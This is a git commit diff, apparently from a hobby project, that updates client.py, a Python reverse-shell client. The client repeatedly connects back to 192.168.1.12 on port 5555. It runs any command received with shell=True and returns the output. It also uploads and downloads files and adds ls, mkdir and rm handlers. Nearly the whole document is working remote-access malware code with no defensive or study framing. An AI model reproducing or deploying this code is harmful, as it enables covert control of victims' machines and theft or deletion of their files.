542587396dfb7b76a8db3ce04a771f360897d105
Teja78906 <99752084+Teja78906@users.noreply.github.com>
2024-07-02 14:02:22 +0530

    Update client.py

--- client.py
+++ client.py
@@ -17,57 +17,61 @@ def reliable_recv():
         except ValueError:
             continue
 
-
-
-
 def connection():
-	while True:
-		time.sleep(20)
-		try:
-			s.connect(('192.168.1.12',5555))
-			shell()
-			s.close()
-			break
-		except:
-			connection()
+    while True:
+        time.sleep(20)
+        try:
+            s.connect(('192.168.1.12', 5555))
+            shell()
+            s.close()
+            break
+        except:
+            connection()
 
 def upload_file(file_name):
-	f = open(file_name, 'rb')
-	s.send(f.read())
-
+    f = open(file_name, 'rb')
+    s.send(f.read())
 
 def download_file(file_name):
-        f = open(file_name, 'wb')
-        s.settimeout(1)
-        chunk = s.recv(1024)
-        while chunk:
-                f.write(chunk)
-                try:
-                        chunk = s.recv(1024)
-                except socket.timeout as e:
-                        break
-        s.settimeout(None)
-        f.close()
-
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+    s.settimeout(None)
+    f.close()
 
 def shell():
-	while True:
-		command = reliable_recv()
-		if command == 'quit':
-			break
-		elif command == 'clear':
-			pass
-		elif command[:3] == 'cd ':
-			os.chdir(command[3:])
-		elif command[:8] == 'download':
-			upload_file(command[9:])
-		elif command[:6] == 'upload':
-			download_file(command[7:])
-		else:
-			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			result = execute.stdout.read() + execute.stderr.read()
-			result = result.decode()
-			reliable_send(result)
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+            break
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
+        elif command[:8] == 'download':
+            upload_file(command[9:])
+        elif command[:6] == 'upload':
+            download_file(command[7:])
+        elif command[:2] == 'ls':
+            result = subprocess.getoutput('ls')
+            reliable_send(result)
+        elif command[:5] == 'mkdir':
+            os.mkdir(command[6:])
+            reliable_send(f'Directory {command[6:]} created.')
+        elif command[:2] == 'rm':
+            os.remove(command[3:])
+            reliable_send(f'File {command[3:]} removed.')
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
